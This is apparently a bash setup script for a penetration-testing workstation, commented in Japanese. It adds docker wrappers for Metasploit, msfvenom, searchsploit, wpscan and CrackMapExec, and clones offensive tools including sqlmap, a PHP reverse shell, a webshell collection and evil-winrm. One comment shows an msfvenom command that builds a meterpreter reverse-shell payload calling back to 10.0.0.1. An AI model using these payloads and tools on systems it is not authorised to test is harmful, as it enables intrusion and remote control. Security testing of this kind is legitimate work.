#!/bin/bash

#####################################################
# Useful docker alias, function
#####################################################
cat <<"EOF" >> ~/.zshrc
# alias sploit="docker run --rm -it --entrypoint="/exploit-database/searchsploit" --name searchsploit fugitivus/searchsploit"
#シグネチャ最新化しときたい。image削除して取り直し？コンテナ入ってupdate? image取り直しで良さそう。aliasだと$@が使えないぽい。
# -m でpocをDLできそうだけど、カレントフォルダにDLされちゃうので -vでやろうとするとホスト側 dirに上書きされちゃうのでその際はwebからコピーすれば良い。
sploit () {
   docker run --rm -it --entrypoint="/exploit-database/searchsploit" --name searchsploit fugitivus/searchsploit "$@"
}

#docker run -it --rm wpscanteam/wpscan --url https://target.tld/ --enumerate
wpscan(){
 docker run -it --rm wpscanteam/wpscan "$@"
}

# docker pull metasploitframework/metasploit-framework:latest
# revers shellやるためにポートフォワードとか入れた方が良い？ -p 4444:4444 みたいな
#alias msf='docker run -ti -p 4444:4444 --rm metasploitframework/metasploit-framework'
#alias metasploit='docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" metasploitframework/metasploit-framework ./msfconsole'
msf() {
    docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework ./msfconsole "$@"
}

#msfvenom を使用して PoC およびテスト用のペイロードを生成。これには、metasploit Docker イメージを使用するのが非常に簡単。
#出力を保存する必要があるため、現在のディレクトリをコンテナーにマウントし、msfvenom コマンドを実行してペイロードを/dataに保存します。 
#alias msfvenom='docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" metasploitframework/metasploit-framework ./msfvenom'
msfvenom() {
    docker run --rm -it -v "${HOME}/.msf4:/home/msf/.msf4" -v "${PWD}:/data" metasploitframework/metasploit-framework ./msfvenom "$@"
}
#最新のimageでやるとうまく動かない。かと言ってbashとかで直接loginして保存しようとしてもmsfユーザの権限が無くて書き込みできない
#その場合、msfした後、bashに入って直接叩けばとりあえず、手元にファイルを落とせる
# bash-5.0$ ./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf > ~/.msf4/reverse.elf

# https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-for-docke
#これで./.zshrcに登録しとけば引数も受け取ってくれる($@で)。--rm によるデータの永続化はどうなるかわからん。
cme () {
   docker run -it --entrypoint=cme --rm -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec "$@"
}
# localに保存するとimpacketがAVに検知される場合あり
# pip install pipx
# pipx ensurepath
# . ~/.zshrc
# pipx install crackmapexec

EOF

#AutoRecon  中でNmap呼んでる。  https://github.com/Tib3rius/AutoRecon  
curl -O https://raw.githubusercontent.com/Tib3rius/AutoRecon/master/Dockerfile
sudo docker build -t tib3rius/autorecon .
#Usage: sudo docker run -it -v /root/results:/results --rm --name autorecon-container tib3rius/autorecon 127.0.0.1
alias autorecon='docker run -it -v ~/.autorecon:/results --rm --name autorecon-container tib3rius/autorecon'

alias aws='docker run --rm -ti -v ~/.aws:/root/.aws -v $(pwd):/aws amazon/aws-cli'



#For osx
cat <<"EOF" >> sss
FNAME=$1
DATE=$(date +"%Y%m%d-%H%M%S")

screencapture \
	~/Desktop/"$FNAME"_${DATE}_screenshot_display1.png \
	~/Desktop/"$FNAME"_${DATE}_screenshot_display2.png

screencapture -i -c \
	~/Desktop/"$FNAME"_${DATE}_screenshot_parcial.png 
EOF
chmod +x sss


#####################################################
# git clone
#####################################################

#git clone https://github.com/leostat/rtfm.git
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/maurosoria/dirsearch.git
git clone https://github.com/pentestmonkey/php-reverse-shell
#git clone https://github.com/offensive-security/exploitdb.git
git clone https://github.com/tennc/webshell.git
git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build

brew install john
# git clone https://github.com/magnumripper/JohnTheRipper.git
# cd JohnTheRipper/src
# ./configure && make clean && make -sj4
wget https://github.com/praetorian-code/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
gunzip rockyou.txt.gz

git clone https://github.com/rebootuser/LinEnum.git

git clone https://github.com/SecureAuthCorp/impacket.git
pipenv --python 3.7.9 && pipenv shell
cd impacket/
ls
pip install .
#python setup.py install

git clone https://github.com/ShawnDEvans/smbmap.git
cd smbmap
pip install -r requirements.txt

git clone https://github.com/dirkjanm/ldapdomaindump.git
cd ldapdomaindump
pip install ldap3 dnspython
pip install ldapdomaindump


#Bloodhound
pip install bloodhound
#for kali
# apt install bloodhound

#Evil-WinRM
sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git



. ~/.zshrc

autorecon &
cme &
wpscan &
sploit &
